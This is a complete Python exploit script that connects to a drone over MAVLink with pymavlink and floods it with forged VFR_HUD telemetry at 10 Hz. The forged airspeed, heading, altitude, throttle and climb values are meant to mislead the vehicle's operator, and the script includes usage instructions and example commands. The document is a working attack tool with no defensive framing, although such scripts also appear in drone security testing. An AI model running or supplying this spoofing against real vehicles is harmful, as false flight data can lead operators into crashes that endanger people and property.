#!/usr/bin/env python3
"""
VFR HUD Spoofing Exploit Script
Injects false Visual Flight Rules HUD data to mislead operator
"""

import sys
import time
from pymavlink import mavutil

def inject_vfr_hud(connection, airspeed=None, groundspeed=None, heading=None, 
                   throttle=None, alt=None, climb=None):
    """
    Inject spoofed VFR_HUD data
    
    Args:
        connection: MAVLink connection object
        airspeed: Airspeed in m/s
        groundspeed: Groundspeed in m/s
        heading: Heading in degrees (0-360)
        throttle: Throttle percentage (0-100)
        alt: Altitude in meters
        climb: Climb rate in m/s
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Default values
    if airspeed is None:
        airspeed = 0.0
    if groundspeed is None:
        groundspeed = 0.0
    if heading is None:
        heading = 0
    if throttle is None:
        throttle = 0
    if alt is None:
        alt = 0.0
    if climb is None:
        climb = 0.0
    
    print(f"[*] Injecting VFR HUD spoof:")
    print(f"    Airspeed: {airspeed} m/s")
    print(f"    Groundspeed: {groundspeed} m/s")
    print(f"    Heading: {heading}Â°")
    print(f"    Throttle: {throttle}%")
    print(f"    Altitude: {alt} m")
    print(f"    Climb Rate: {climb} m/s")
    
    # Send VFR_HUD message
    connection.mav.vfr_hud_send(
        airspeed,      # Airspeed in m/s
        groundspeed,   # Groundspeed in m/s
        heading,       # Heading in degrees
        throttle,      # Throttle percentage
        alt,           # Altitude in meters
        climb          # Climb rate in m/s
    )
    
    print("[+] VFR HUD spoof injected")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 vfr_hud_spoofing.py <connection> [airspeed] [groundspeed] [heading] [throttle] [alt] [climb]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  airspeed      Airspeed in m/s (default: 0)")
        print("  groundspeed   Groundspeed in m/s (default: 0)")
        print("  heading       Heading in degrees 0-360 (default: 0)")
        print("  throttle      Throttle percentage 0-100 (default: 0)")
        print("  alt           Altitude in meters (default: 0)")
        print("  climb         Climb rate in m/s (default: 0)")
        print("\nExamples:")
        print("  python3 vfr_hud_spoofing.py udp:127.0.0.1:14550")
        print("  python3 vfr_hud_spoofing.py udp:127.0.0.1:14550 15.0 12.0 180 50 100 2.0")
        print("  python3 vfr_hud_spoofing.py udp:127.0.0.1:14550 0 0 0 0 0 0  # Zero all values")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    airspeed = float(sys.argv[2]) if len(sys.argv) > 2 else None
    groundspeed = float(sys.argv[3]) if len(sys.argv) > 3 else None
    heading = int(sys.argv[4]) if len(sys.argv) > 4 else None
    throttle = int(sys.argv[5]) if len(sys.argv) > 5 else None
    alt = float(sys.argv[6]) if len(sys.argv) > 6 else None
    climb = float(sys.argv[7]) if len(sys.argv) > 7 else None
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Inject VFR HUD spoof
    print("[*] Injecting VFR HUD spoof (Press Ctrl+C to stop)...")
    try:
        while True:
            inject_vfr_hud(connection, airspeed, groundspeed, heading, throttle, alt, climb)
            time.sleep(0.1)  # Send at 10Hz
    except KeyboardInterrupt:
        print("\n[*] Stopping VFR HUD spoofing...")

if __name__ == "__main__":
    main()
